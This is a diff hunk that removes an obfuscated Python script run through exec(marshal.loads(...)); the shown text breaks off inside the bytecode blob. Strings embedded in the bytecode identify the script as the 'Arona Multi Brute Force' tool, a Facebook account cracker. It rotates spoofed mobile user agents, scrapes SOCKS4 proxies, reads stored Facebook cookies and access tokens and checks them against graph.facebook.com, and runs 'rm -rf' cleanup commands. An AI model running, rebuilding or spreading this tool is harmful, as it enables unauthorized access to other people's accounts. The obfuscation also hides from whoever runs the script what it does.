@@ -1,3 +1,1457 @@
-#Enc Ini Dibuat Oleh Hikmat Gans:v
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s\x1a\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns\xc0\x98\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00@\x00\x00\x00s4\x08\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04d\x00d\x01l\x05Z\x05d\x00d\x01l\x06Z\x06d\x00d\x01l\x07Z\x07d\x00d\x01l\x08Z\x08d\x00d\x01l\tZ\td\x00d\x01l\nZ\nd\x00d\x02l\x0bm\x0cZ\r\x01\x00d\x00d\x03l\x01m\x0eZ\x0f\x01\x00d\x00d\x04l\x10m\x11Z\x12\x01\x00d\x00d\x05l\x02m\x13Z\x14\x01\x00d\x00d\x06l\x05m\x15Z\x15\x01\x00d\x00d\x07l\x08m\x16Z\x17\x01\x00d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13d\x14\x9c\x0cZ\x18e\x07j\x07\xa0\x19\xa1\x00j\x1aZ\x1be\x18e\x1ce\x07j\x07\xa0\x19\xa1\x00j\x1d\x83\x01\x19\x00Z\x1ee\x07j\x07\xa0\x19\xa1\x00j\x1fZ e\x1ce\x1b\x83\x01d\x15\x17\x00e\x1ce\x1e\x83\x01\x17\x00d\x15\x17\x00e\x1ce \x83\x01\x17\x00Z!e\x1ce\x1b\x83\x01d\x15\x17\x00e\x1ce\x1e\x83\x01\x17\x00d\x15\x17\x00e\x1ce \x83\x01\x17\x00d\x16\x17\x00Z"e\x1ce\x1b\x83\x01d\x15\x17\x00e\x1ce\x1e\x83\x01\x17\x00d\x15\x17\x00e\x1ce \x83\x01\x17\x00d\x16\x17\x00Z#g\x00d\x00g\x00g\x00g\x00g\x00g\x00g\x00g\x00g\x00f\n\\\nZ$a%Z&Z\'Z(a)a*Z+Z,Z-g\x00g\x00g\x00g\x00f\x04\\\x04Z.Z/Z0Z1e2d\x17\x83\x01D\x00\x90\x01]dZ3e\x05j\x15Z4e\x05j5Z6g\x00d\x18\xa2\x01Z7d\x19e\x1ce4d\x1ad\x1b\x83\x02\x83\x01\x9b\x00d\x1ce\x1ce4d\x1dd\x1e\x83\x02\x83\x01\x9b\x00d\x1fe\x1ce4d d!\x83\x02\x83\x01\x9b\x00d"e\x1ce4d#d$\x83\x02\x83\x01\x9b\x00d%e\x1ce4d&d\'\x83\x02\x83\x01\x9b\x00d(\x9d\x0bZ8e8e+v\x00\x90\x02r\x16n\ne+\xa09e8\xa1\x01\x01\x00d)e\x1ce4d\x1ad\x1b\x83\x02\x83\x01\x9b\x00d*e\x1ce4d+d\x1a\x83\x02\x83\x01\x9b\x00d,e\x1ce4d d!\x83\x02\x83\x01\x9b\x00d-e\x1ce4d.d\x1e\x83\x02\x83\x01\x9b\x00d/e\x1ce4d#d0\x83\x02\x83\x01\x9b\x00d1e\x1ce4d#d0\x83\x02\x83\x01\x9b\x00d2\x9d\rZ:e:e+v\x00\x90\x02r\x92n\ne+\xa09e:\xa1\x01\x01\x00d)e\x1ce4d3d4\x83\x02\x83\x01\x9b\x00d5e\x1ce6e7\x83\x01\x83\x01\x9b\x00e\x1ce4d#d$\x83\x02\x83\x01\x9b\x00e\x1ce6e7\x83\x01\x83\x01\x9b\x00d6e\x1ce4d7d8\x83\x02\x83\x01\x9b\x00\x9d\x08Z;e;e+v\x00\x90\x02r\xf4n\ne+\xa09e;\xa1\x01\x01\x00\x90\x01q\x9ae2d9\x83\x01D\x00\x90\x01]jZ<d:Z=e\x05\xa0>d.d\x1e\xa1\x02Z?e\x05\xa0>d.d\x1e\xa1\x02Z@d;ZAe\x05\xa0>d<d$\xa1\x02ZBd=ZCe\x05\xa0>d.d\x1e\xa1\x02ZDe\x05\xa0>d.d\x1d\xa1\x02ZEe\x05\xa0>d.d\x1d\xa1\x02ZFe\x05\xa0>d.d\x1d\xa1\x02ZGd>ZHe=\x9b\x00e?\x9b\x00d?e@\x9b\x00d@eA\x9b\x00eB\x9b\x00eC\x9b\x00eD\x9b\x00d?eE\x9b\x00d?eF\x9b\x00d?eG\x9b\x00d@eH\x9b\x00\x9d\x11ZIe+\xa09eI\xa1\x01\x01\x00dAZJe\x05\xa05g\x00dB\xa2\x01\xa1\x01Z?dCZ@e\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZAe\x05\xa0>d.d8\xa1\x02ZBe\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZCdDZDe\x05\xa0>dEd<\xa1\x02ZEdFZFe\x05\xa0>dGdH\xa1\x02ZGe\x05\xa0>dIdJ\xa1\x02ZHdKZKeJ\x9b\x00d@e?\x9b\x00dLe@\x9b\x00eA\x9b\x00eB\x9b\x00eC\x9b\x00dMeD\x9b\x00eE\x9b\x00d?eF\x9b\x00d?eG\x9b\x00d?eH\x9b\x00d@eK\x9b\x00\x9d\x13ZLe+\xa09eL\xa1\x01\x01\x00\x90\x03q\ne2d\x1b\x83\x01D\x00]\xc0ZMdNZ=e\x05\xa0>d<d$\xa1\x02Z?e\x05\xa0>d<d$\xa1\x02Z@e\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZAe\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZBe\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZCe\x05\xa05g\x00d\x18\xa2\x01\xa1\x01ZDe\x05\xa0>d.d\x1e\xa1\x02ZEdOZFe\x05\xa0>d.d\x1e\xa1\x02ZGe\x05\xa0>d.d\x1e\xa1\x02ZHdPZKe=\x9b\x00e?\x9b\x00dQe@\x9b\x00eA\x9b\x00eB\x9b\x00eC\x9b\x00eD\x9b\x00eE\x9b\x00eF\x9b\x00eG\x9b\x00d?eH\x9b\x00d@eK\x9b\x00\x9d\x0fZN\x90\x04q\x80dRdS\x84\x00ZOdTZPdUZQdVZRdWZSdXdYi\x01ZTdZd[\x84\x00ZUd\\d]\x84\x00ZVd^d_\x84\x00ZWd`ZXdaZYdbZZdcZ[ddZ\\deZ]dfZ^dgZ_dhZ`diZadjZbdkZcdlZddmZednZfdoZgdpZhdqZidrZjdsZkdtZlduZmdvZndwZodxZpdyZqdzZrd{Zsd|Zte\x05\xa05esegeeeqeoemekeiecg\t\xa1\x01Zue\x05\xa05esegeeeoemekeig\x07\xa1\x01Zvd@eX\x9b\x00d}eZ\x9b\x00d~eX\x9b\x00d\x7f\x9d\x07Zwe\x07j\x07\xa0\x19\xa1\x00Z\x19e\x19jxZxexd\x1dk\x00\x90\x06rZd\x80Zyn\x8cd\x1dex\x04\x00\x03\x00k\x01\x90\x06rrd4k\x00\x90\x06r|n\x04\x01\x00n\x06d\x81Zynjd4ex\x04\x00\x03\x00k\x01\x90\x06r\x94d\x82k\x00\x90\x06r\x9en\x04\x01\x00n\x06d\x83ZynHd\x82ex\x04\x00\x03\x00k\x01\x90\x06r\xb6d\x84k\x00\x90\x06r\xc0n\x04\x01\x00n\x06d\x85Zyn&d\x84ex\x04\x00\x03\x00k\x01\x90\x06r\xd8d\x86k\x00\x90\x06r\xe2n\x04\x01\x00n\x06d\x87Zyn\x04d\x88Zyd\x89d\x8a\x84\x00Zzd\x8bd\x8c\x84\x00Z{d\x8dd\x8e\x84\x00Z|d\x8fd\x90\x84\x00Z}e\x07j\x07\xa0\x19\xa1\x00Z\x19e\x19jxZxexd\x1dk\x00\x90\x07r&d\x80Zyn\x8cd\x1dex\x04\x00\x03\x00k\x01\x90\x07r>d4k\x00\x90\x07rHn\x04\x01\x00n\x06d\x81Zynjd4ex\x04\x00\x03\x00k\x01\x90\x07r`d\x82k\x00\x90\x07rjn\x04\x01\x00n\x06d\x83ZynHd\x82ex\x04\x00\x03\x00k\x01\x90\x07r\x82d\x84k\x00\x90\x07r\x8cn\x04\x01\x00n\x06d\x85Zyn&d\x84ex\x04\x00\x03\x00k\x01\x90\x07r\xa4d\x86k\x00\x90\x07r\xaen\x04\x01\x00n\x06d\x87Zyn\x04d\x88Zyd\x91d\x92\x84\x00Z~d\x93d\x94\x84\x00Z\x7fd\x95d\x96\x84\x00Z\x80d\x97d\x98\x84\x00Z\x81d\x99d\x9a\x84\x00Z\x82d\x9bd\x9c\x84\x00Z\x83d\x9dd\x9e\x84\x00Z\x84d\x9fd\xa0\x84\x00Z\x85d\xa1d\xa2\x84\x00Z\x86d\xa3d\xa4\x84\x00Z\x87d\xa5d\xa6\x84\x00Z\x88d\xa7d\xa8\x84\x00Z\x89d\xa9d\xaa\x84\x00Z\x8ad\xabd\xac\x84\x00Z\x8bd\xadd\xae\x84\x00Z\x8ce{\x83\x00\x01\x00d\x01S\x00)\xaf\xe9\x00\x00\x00\x00N)\x01\xda\x12ThreadPoolExecutor)\x01\xda\rBeautifulSoup)\x01\xda\x05Panel)\x01\xda\x05print)\x01\xda\x07randint)\x01\xda\x05sleepZ\x07januariZ\x08februariZ\x05maretZ\x05aprilZ\x03meiZ\x04juniZ\x04juliZ\x07agustusZ\tseptemberZ\x07oktoberZ\x08novemberZ\x08desember)\x0c\xda\x011\xda\x012\xda\x013\xda\x014\xda\x015\xda\x016\xda\x017\xda\x018\xda\x019\xda\x0210\xda\x0211\xda\x0212\xfa\x01-z\x04.txti\xe8\x03\x00\x00)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01L\xda\x01M\xda\x01N\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Zz\x1cMozilla/5.0 (Linux; Android \xe9\x08\x00\x00\x00\xe9\n\x00\x00\x00z\x08; Redmi \xe9\x04\x00\x00\x00\xe9\t\x00\x00\x00z\x0c Build/PPR1.i\x07\xb2\x01\x00i?\r\x03\x00zC.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.iW\x04\x00\x00i\x0f\'\x00\x00z\'.136 Mobile Safari/537.36 Puffin/9.7.2.ig+\x00\x00i\x9f\x86\x01\x00Z\x02APz\x1fMozilla/5.0 (Linux; U; Android z\x14; en-US; Redmi Note \xe9\x05\x00\x00\x00z\x0c Build/PKQ1.z\x03.00\xe9\x01\x00\x00\x00zA AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.i\n\x1a\x00\x00z\x14.2 UCBrowser/13.4.0.z\x15 Mobile Safari/537.36\xe9\x07\x00\x00\x00\xe9\x0c\x00\x00\x00z\x0c; en-US; SM-za) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.\xe9o\x00\x00\x00i\xe7\x03\x00\x00i\x10\'\x00\x00z!Mozilla/5.0 (Symbian/3; Series60/Z\x05Nokia\xe9d\x00\x00\x00zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/z\x13Mobile Safari/535.1\xda\x01.\xfa\x01 z\x1eMozilla/5.0 (Linux; U; Android)\x07r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00r\x10\x00\x00\x00r\x11\x00\x00\x00r\x12\x00\x00\x00r\x13\x00\x00\x00z\x0b en-us; GT-z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\xe9I\x00\x00\x00\xda\x010ih\x10\x00\x00i$\x13\x00\x00\xe9(\x00\x00\x00\xe9\x96\x00\x00\x00z\x14Mobile Safari/537.36z\x02; z\x02) z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/z\x1fMobile WVGA SMM-MMS/1.2.0 OPN-B\xfa\x01/c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\x8c\x00\x00\x00z*t\x00d\x01d\x02\x83\x02\xa0\x01\xa1\x00\xa0\x02\xa1\x00}\x00|\x00D\x00]\x0e}\x01t\x03\xa0\x04|\x01\xa1\x01\x01\x00q\x18W\x00n\\\x01\x00\x01\x00\x01\x00t\x05\xa0\x06d\x03\xa1\x01j\x07}\x02t\x00d\x04d\x05\x83\x02}\x00t\x08\xa0\td\x06t\n|\x02\x83\x01\xa1\x02}\x03|\x03D\x00]\x12}\x04|\x00\xa0\x0b|\x04d\x07\x17\x00\xa1\x01\x01\x00q\\t\x00d\x04d\x02\x83\x02\xa0\x01\xa1\x00\xa0\x02\xa1\x00}\x00Y\x00n\x020\x00d\x00S\x00)\x08Nz\tbbnew.txt\xda\x01rz0https://github.com/EC-1709/a/blob/main/bbnew.txtz\n.bbnew.txt\xda\x01wz\x0cline">(.*?)<\xda\x01\n)\x0c\xda\x04open\xda\x04read\xda\nsplitlines\xda\x08ua_crack\xda\x06append\xda\x08requests\xda\x03get\xda\x04text\xda\x02reZ\x07findall\xda\x03str\xda\x05write)\x05\xda\x02uaZ\x02ub\xda\x01a\xda\x02aaZ\x02un\xa9\x00rQ\x00\x00\x00\xda\x00\xda\x05uakdoY\x00\x00\x00s\x16\x00\x00\x00\x00\x01\x02\x01\x12\x01\x08\x01\x10\x01\x06\x01\x0c\x01\n\x01\x10\x01\x08\x01\x10\x01rS\x00\x00\x00\xfa\x0em.facebook.comz\x1dhttps://business.facebook.comz\x8eMozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36z\x19https://www.facebook.com/\xfa\nuser-agentz\xccMozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00C\x00\x00\x00s\x0e\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00d\x00S\x00)\x02N\xda\x05clear)\x02\xda\x02os\xda\x06systemrQ\x00\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00rV\x00\x00\x00l\x00\x00\x00s\x02\x00\x00\x00\x00\x01rV\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s0\x00\x00\x00|\x00d\x01\x17\x00D\x00]"}\x01t\x00j\x01\xa0\x02|\x01\xa1\x01\x01\x00t\x00j\x01\xa0\x03\xa1\x00\x01\x00t\x04d\x02\x83\x01\x01\x00q\x08d\x00S\x00)\x03NrB\x00\x00\x00\xe7\x9a\x99\x99\x99\x99\x99\xa9?)\x05\xda\x03sys\xda\x06stdoutrM\x00\x00\x00\xda\x05flush\xda\x04turu)\x02\xda\x04xnxxZ\x03ewerQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\x05jalann\x00\x00\x00s\x04\x00\x00\x00\x00\x01\x0c\x01r_\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00sd\x00\x00\x00z t\x00\xa0\x01d\x01\xa1\x01j\x02}\x00t\x03d\x02d\x03\x83\x02\xa0\x04|\x00\xa1\x01\x01\x00W\x00n,\x04\x00t\x05yL\x01\x00}\x01\x01\x00z\x14t\x06d\x04\x83\x01\x01\x00W\x00Y\x00d\x00}\x01~\x01n\nd\x00}\x01~\x010\x000\x00t\x03d\x02d\x05\x83\x02\xa0\x07\xa1\x00\xa0\x08\xa1\x00}\x00d\x00S\x00)\x06Nzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all\xfa\rproxy_mat.txtrA\x00\x00\x00Z\x06Failedr@\x00\x00\x00)\trH\x00\x00\x00rI\x00\x00\x00rJ\x00\x00\x00rC\x00\x00\x00rM\x00\x00\x00\xda\tExceptionr\x05\x00\x00\x00rD\x00\x00\x00rE\x00\x00\x00)\x02Z\x05proxf\xda\x01erQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\x05proxpr\x00\x00\x00s\x0c\x00\x00\x00\x00\x01\x02\x01\x0c\x01\x14\x01\x0e\x01\x1e\x01rc\x00\x00\x00z\x07\x1b[0;97mz\x07\x1b[0;91mz\x07\x1b[0;92mz\x07\x1b[0;93mz\x07\x1b[0;94mz\x07\x1b[0;95mz\x07\x1b[0;96mz\x04\x1b[0mz\x07\x1b[1;36mz\t[#000000]z\t[#FF0000]z\x07#FF0000z\t[#00FF00]z\x07#00FF00z\t[#FFFF00]z\x07#FFFF00z\t[#00C8FF]z\x07#00C8FFz\t[#AF00FF]z\x07#AF00FFz\t[#FF00FF]z\x07#FF00FFz\t[#00FFFF]z\x07#00FFFFz\t[#FFFFFF]z\x07#FFFFFFz\t[#FF8F00]z\x07#FF8F00z\t[#AAAAAA]\xfa\x01[\xf5\x03\x00\x00\x00\xe2\x80\xa2\xfa\x01]z\x11selamat dini hariz\x0cselamat pagi\xe9\x0f\x00\x00\x00z\rselamat siang\xe9\x11\x00\x00\x00z\x0cselamat sore\xe9\x12\x00\x00\x00z\x0eselamat petangz\rselamat malamc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s$\x00\x00\x00t\x00\xa0\x01d\x01\xa1\x01\x01\x00t\x02d\x02t\x03\x9b\x00d\x03t\x04\x9b\x00d\x04\x9d\x05\x83\x01\x01\x00d\x00S\x00)\x05NrV\x00\x00\x00u2\x01\x00\x00\n\t   _____      _____   __________ ___________\n\t  /  _  \\    /     \\  \\______   \\_   _____/\n\t /  /_\\  \\  /  \\ /  \\  |    |  _/ |    __)  \n\t/    |    \\/    Y    \\ |    |   \\ |     \\   \n\t\\____|__  /\\____|__  / |______  / \\___  /   \n\t        \\/         \\/         \\/      \\/ \xe2\x80\xa2 Arona Multi Brute Force \xe2\x80\xa2\n\t\tz\x0b author by z\tHikmatXD\n)\x05rW\x00\x00\x00rX\x00\x00\x00r\x05\x00\x00\x00\xda\x05garisr\x1f\x00\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\x06banner\xac\x00\x00\x00s\x0c\x00\x00\x00\x00\x01\n\x01\x04\x07\x02\xf9\x04\x07\x02\xf9rk\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xb8\x01\x00\x00\x90\x01z\x96t\x00d\x01d\x02\x83\x02\xa0\x01\xa1\x00}\x00d\x03t\x00d\x04d\x02\x83\x02\xa0\x01\xa1\x00i\x01}\x01z\xe2t\x00d\x01d\x02\x83\x02\xa0\x01\xa1\x00}\x00d\x03t\x00d\x04d\x02\x83\x02\xa0\x01\xa1\x00i\x01}\x01t\x00d\x04d\x02\x83\x02\xa0\x01\xa1\x00}\x02t\x02\xa0\x03\xa1\x00j\x04d\x05|\x00\x16\x00|\x01d\x06\x8d\x02}\x03t\x05\xa0\x06|\x03j\x07\xa1\x01}\x04|\x04d\x07\x19\x00}\x05t\x08\x9b\x00|\x02\x9b\x00\x9d\x02}\x06t\tt\n|\x06t\x0b\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x08\x9b\x00|\x00\x9b\x00\x9d\x02}\x06t\tt\n|\x06t\x0b\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x0cd\t\x83\x01\x01\x00d\nt\x08\x9b\x00d\x0bt\r\x9b\x00|\x05\x9b\x00d\x0ct\x08\x9b\x00d\r\x9d\x08}\x06t\tt\n|\x06t\x0b\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x0et\x0f\x9b\x00d\x0e\x9d\x02\x83\x01\x01\x00t\x10\x83\x00\x01\x00W\x00n\x8e\x04\x00t\x11\x90\x01yZ\x01\x00\x01\x00\x01\x00d\nt\x08\x9b\x00d\x0f\x9d\x03}\x06t\tt\n|\x06t\x0b\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x12\xa0\x13d\x10\xa1\x01\x01\x00t\x12\xa0\x13d\x11\xa1\x01\x01\x00t\x14d\x12\x83\x01\x01\x00t\x15\x83\x00\x01\x00Y\x00n<\x04\x00t\x02j\x16j\x17\x90\x01y\x94\x01\x00\x01\x00\x01\x00d\nt\x08\x9b\x00d\x13\x9d\x03}\x06t\tt\n|\x06t\x0b\x9b\x00d\x08\x8d\x02\x83\x01\x01\x00t\x18\x83\x00\x01\x00Y\x00n\x020\x00W\x00n\x1a\x04\x00t\x19\x90\x01y\xb2\x01\x00\x01\x00\x01\x00t\x15\x83\x00\x01\x00Y\x00n\x020\x00d\x00S\x00)\x14N\xfa\ttoken.txtr@\x00\x00\x00\xda\x06cookie\xfa\ncookie.txt\xfa<https://graph.facebook.com/me?fields=name,id&access_token=%s\xa9\x01\xda\x07cookies\xda\x04name\xa9\x01Z\x05stylerR\x00\x00\x00\xfa\x02\t\tz\x07cookie r:\x00\x00\x00z\rbelum invalid\xfa\x15 enter untuk ke menu z\x11cookie kadaluarsa\xfa\x11rm -rf cookie.txt\xfa\x10rm -rf token.txtrY\x00\x00\x00\xfa\x1bkoneksi internet bermasalah)\x1arC\x00\x00\x00rD\x00\x00\x00rH\x00\x00\x00\xda\x07SessionrI\x00\x00\x00\xda\x04json\xda\x05loadsrJ\x00\x00\x00\xda\x02P2\xda\x06vprint\xda\x05panel\xda\x16warna_warni_rich_cerahr\x05\x00\x00\x00\xda\x02H2\xda\x05inputrj\x00\x00\x00\xda\x04menu\xda\x08KeyErrorrW\x00\x00\x00rX\x00\x00\x00r]\x00\x00\x00\xda\x05login\xda\nexceptions\xda\x0fConnectionError\xda\x04exit\xda\x07IOError)\x07\xda\x05tokenrm\x00\x00\x00Z\x04kookrI\x00\x00\x00Z\x03gutZ\x05xname\xda\x01xrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00\xda\ncek_cookie\xb8\x00\x00\x00s@\x00\x00\x00\x00\x01\x04\x01\x0e\x01\x12\x01\x02\x01\x0e\x01\x12\x01\x0e\x01\x16\x01\x0c\x01\x08\x01\x0c\x01\x12\x01\x0c\x01\x12\x01\x08\x01\x1c\x01\x12\x01\x0e\x01\n\x01\x0e\x01\x0c\x01\x12\x01\n\x01\n\x01\x08\x01\n\x01\x12\x01\x0c\x01\x12\x01\x10\x01\x0e\x01r\x8b\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x0b\x00\x00\x00C\x00\x00\x00s\xee\x01\x00\x00t\x00\x83\x00\x01\x00t\x01\x9b\x00d\x01t\x01\x9b\x00d\x02t\x02\x9b\x00d\x03t\x01\x9b\x00d\x04\x9d\x08}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x06d\x06\x83\x01\x01\x00d\x07t\x01\x9b\x00d\x08t\x01\x9b\x00d\tt\x01\x9b\x00d\nt\x02\x9b\x00d\x0bt\x01\x9b\x00d\x0c\x9d\x0b}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x07d\rt\x08\x9b\x00d\nt\t\x9b\x00d\x0et\x08\x9b\x00d\x0ft\t\x9b\x00\x9d\x08\x83\x01}\x01|\x01d\x10v\x00\x90\x01r\x1et\x06d\x06\x83\x01\x01\x00t\x01\x9b\x00d\x11t\n\x9b\x00d\x12t\x01\x9b\x00d\x13\x9d\x06}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x06d\x06\x83\x01\x01\x00t\x01\x9b\x00d\x14\x9d\x02}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x0b\xa0\x0cd\x15\xa1\x01\x01\x00t\x07d\rt\x08\x9b\x00d\nt\t\x9b\x00d\x0et\x08\x9b\x00d\x16\x9d\x07\x83\x01\x01\x00t\r\x83\x00\x01\x00n\xcc|\x01d\x17v\x00\x90\x01r0t\x0e\x83\x00\x01\x00n\xba|\x01d\x18v\x00\x90\x01r\xbct\x06d\x06\x83\x01\x01\x00t\x01\x9b\x00d\x11t\n\x9b\x00d\x12t\x01\x9b\x00d\x19\x9d\x06}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x06d\x06\x83\x01\x01\x00t\x01\x9b\x00d\x14\x9d\x02}\x00t\x03t\x04|\x00t\x05\x9b\x00d\x05\x8d\x02\x83\x01\x01\x00t\x0b\xa0\x0cd\x1a\xa1\x01\x01\x00t\x07d\rt\x08\x9b\x00d\nt\t\x9b\x00d\x0et\x08\x9b\x00d\x16\x9d\x07\x83\x01\x01\x00t\r\x83\x00\x01\x00n.|\x01d\x1bv\x00\x90\x01r\xcet\x0f\x83\x00\x01\x00n\x1ct\x06d\x06\x83\x01\x01\x00t\x10t\x11\x9b\x00d\x1c\x9d\x02\x83\x01\x01\x00t\r\x83\x00\x01\x00d\x00S\x00)\x1dNz0halo pengguna script arona multi brute force :)\nuz\x00\x00\x00silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa\xc2\xb2 bisa ketik z\x05help z\x18untuk meminta bantuan !!rs\x00\x00\x00rR\x00\x00\x00rt\x00\x00\x00z\x19[01] login with cookie\n\t\tz\x19[02] report bug script\n\t\trd\x00\x00\x00\xda\x0200z\x07] exit r:\x00\x00\x00re\x00\x00\x00z\n] pilih : )\x03\xda\x04helpZ\x04HelpZ\x04HELPz\x14whatsapp admin *--> z\r082115413282 zsharap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakkz#sedang diarahkan ke whastapp authorzPxdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?\xfa\t] kembali\xa9\x02r\x08\x00\x00\x00\xda\x0201\xa9\x02r\t\x00\x00\x00\xda\x0202zUharap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakkzNxdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!\xa9\x02r<\x00\x00\x00r\x8c\x00\x00\x00z\x12 isi yang benar!! )\x12rk\x00\x00\x00r|\x00\x00\x00\xda\x02M2r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x05\x00\x00\x00r\x81\x00\x00\x00r$\x00\x00\x00r\x1c\x00\x00\x00r\x80\x00\x00\x00rW\x00\x00\x00rX\x00\x00\x00r\x84\x00\x00\x00\xda\x0clogin_cookier\x87\x00\x00\x00r_\x00\x00\x00rj\x00\x00\x00)\x02r\x8a\x00\x00\x00Z\x05cukufrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\x84\x00\x00\x00\xda\x00\x00\x00sD\x00\x00\x00\x00\x01\x06\x01\x1c\x01\x12\x01\x08\x01$\x01\x12\x01 \x01\n\x01\x08\x01\x16\x01\x12\x01\x08\x01\n\x01\x12\x01\n\x01\x1c\x01\x08\x01\n\x01\x08\x01\n\x01\x08\x01\x16\x01\x12\x01\x08\x01\n\x01\x12\x01\n\x01\x1c\x01\x08\x01\n\x01\x08\x02\x08\x01\x0e\x01r\x84\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\r\x00\x00\x00C\x00\x00\x00s\x9c\x01\x00\x00t\x00d\x01\x83\x01\x01\x00t\x01\x9b\x00d\x02\x9d\x02}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x03\x8d\x02\x83\x01\x01\x00t\x05t\x06t\x07\x9b\x00d\x04\x9d\x02t\x08\x17\x00d\x05\x17\x00\x83\x01\x83\x01}\x01t\t\xa0\n\xa1\x00\x90\x01\x8f>}\x02z\xa4t\x0bt\x07\x9b\x00d\x06\x9d\x02\x83\x01\x01\x00|\x02j\x0ct\rd\x07\x17\x00t\x0et\x0fd\x08t\rd\td\nd\x0bd\x0cd\rd\x0e\x9c\td\x0f|\x01i\x01d\x10\x8d\x03}\x03t\x10\xa0\x11d\x11|\x03j\x12\xa1\x02\xa0\x13d\x12\xa1\x01}\x04t\x14d\x13d\x14\x83\x02\xa0\x15|\x01\xa1\x01\x01\x00t\x14d\x15d\x14\x83\x02\xa0\x15|\x04\xa1\x01\x01\x00t\x01\x9b\x00|\x04\x9b\x00\x9d\x02}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x03\x8d\x02\x83\x01\x01\x00t\x06t\x07\x9b\x00d\x16\x9d\x02\x83\x01\x01\x00t\x16\x83\x00\x01\x00W\x00n\x88\x04\x00t\tj\x17j\x18\x90\x01y$\x01\x00\x01\x00\x01\x00d\x17t\x01\x9b\x00d\x18\x9d\x03}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x03\x8d\x02\x83\x